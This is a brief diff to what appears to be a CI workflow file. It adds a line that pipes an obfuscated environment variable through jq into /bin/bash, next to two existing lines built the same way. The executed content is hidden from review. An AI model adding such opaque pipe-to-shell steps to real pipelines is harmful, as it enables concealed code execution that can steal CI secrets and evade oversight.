@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$she019" | jq -r .pfra049 | /bin/bash
           echo $vnoo0165 | jq -r .q13 | /bin/bash
+          echo $l52025 | jq -r .ydel8 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
